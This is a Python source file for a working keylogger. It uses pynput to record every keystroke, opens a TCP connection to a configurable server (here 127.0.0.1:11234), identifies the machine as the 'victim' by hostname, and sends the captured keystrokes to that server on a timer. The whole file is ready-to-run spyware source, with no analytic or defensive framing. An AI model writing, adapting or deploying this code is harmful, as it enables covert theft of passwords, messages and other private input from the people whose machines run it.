#!/usr/bin/env python3
from pynput import keyboard
from threading import Timer
import socket
import sys
import errno


class Keylogger:
    def __init__(self, interval, ip, port, h_length):
        self.interval = interval
        self.header_lenght = h_length
        self.log = ""
        pc_name = socket.gethostname()
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.connect((ip, port))
        self.client_socket.setblocking(False)
        self.victim = pc_name.encode('utf-8')
        usr_hlenght = f"{len(pc_name):<{self.header_lenght}}".encode('utf-8')
        self.client_socket.send(usr_hlenght + self.victim)

    # function to add keys 2 the current ones
    def _append_to_log(self, string):
        self.log = self.log + string

    # process the pressed key
    def _process_pressed_key(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.tab:
                current_key = "\t"
            elif key == key.enter:
                current_key = "\n"
            else:
                current_key = "<" + str(key) + ">"
        self._append_to_log(current_key)

    def _send_2_server(self):
        if self.log != "":
            message = self.log.encode('utf-8')
            message_header = f"{len(message):<{self.header_lenght}}".encode('utf-8')
            self.client_socket.send(message_header + message)
        try:
            while True:
                username_header = self.client_socket.recv(self.header_lenght)
                if not len(username_header):
                    print('Connection closed by the server')
                    sys.exit()

                username_length = int(username_header.decode('utf-8').strip())
                username = self.client_socket.recv(username_length).decode('utf-8')
                message_header = self.client_socket.recv(self.header_lenght)
                message_length = int(message_header.decode('utf-8').strip())
                message = self.client_socket.recv(message_length).decode('utf-8')

        except IOError as e:
            if e.errno != errno.EAGAIN and e.errno != errno.EWOULDBLOCK:
                print(f'Reading error: {str(e)}')
                sys.exit()
        except Exception as e:
            print(f'Reading error: {str(e)}')
            sys.exit()

    # function to print the user input in the given interval
    def _report(self):
        self._send_2_server()
        self.log = ""
        timer = Timer(self.interval, self._report)
        timer.start()

    def start(self):
        # listening 2 the user input
        keyboard_listener = keyboard.Listener(on_press=self._process_pressed_key)
        with keyboard_listener:
            # starts sending keys to server
            self._report()
            # waiting the listener to finish
            keyboard_listener.join()


# adding a print interval of 10 seconds
keylogger = Keylogger(60, "127.0.0.1", 11234, 10)
# starting the keyloggger
keylogger.start()
